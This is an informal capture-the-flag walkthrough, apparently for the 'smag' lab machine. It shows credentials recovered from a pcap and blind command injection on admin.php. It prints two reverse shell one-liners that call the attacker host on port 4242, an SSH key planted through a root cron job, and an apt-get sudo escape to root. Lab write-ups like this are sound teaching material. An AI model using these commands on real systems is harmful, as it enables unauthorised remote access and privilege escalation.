went to the main dir and found out there is a pcap file which we can download after downloading that we have to analyse the fole with wireshark


when we will examine the file there are only 10 packets that have been used!

just see through those packets the follow > tcp stream you will see the credentials for a user

username=helpdesk&password=cH4nG3M3_n0w

as we have earlier seen in nmap scan that ther is a subdomain in the website as development.smag.thm just add that in the host file and visit that website we will see 3 files

out of those when we will visit the admin.php we are redirected to the login page wehere we can use these creds  and we enter a page where we can execute commands ! first i was confused that why i cant see the commands getting exectued but later i found out it was blind command injection  just tried with some of the rev shells second one worked for me

bash -i >& /dev/tcp/$ip/4242 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.81.2 4242 >/tmp/f


after that you will recieve a rev connection on your terminal now i started looking for suid file sudo perms and in all the directories for the next priv but i was not able to get anything after few minutes i remeber to check about crontabs 

cat /etc/crontabs

*  *    * * *   root	/bin/cat /opt/.backups/jake_id_rsa.pub.backup > /home/jake/.ssh/authorized_keys


we can see root user is redirecting the jake_id_rsa.pub.backup to authorozed keys!

i visite the  /opt/.backups/jake_id_rsa.pub.backup file and checked for permissions i can write that file! now i can put my keys there and get an ssh connction

first we will make ssh keys in out computer

ssh-keygen 

now you have to go to .ssh dir or where you have saved the keys
now start a http.server inside that dir

python3 -m http.server

and now in the victim pc do this

curl http://ip_of_attacker:8000/id_rsa.pub -o /opt/.backups/jake_id_rsa.pub.backup


now this will output the id_rsa.pub to the jake rsa 
which will redirect it to the authorized keys

now use the id_rsa key in the attacker pc to login into the victim pc



ssh -i id_rsa jake@victimip

now you are logged in as jake user

sudo -l

we can see we have permission to run apt-get as sudo permissions

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh


visited gtfobins and got this command and i got root !
cheers now we can get the flags cheers!
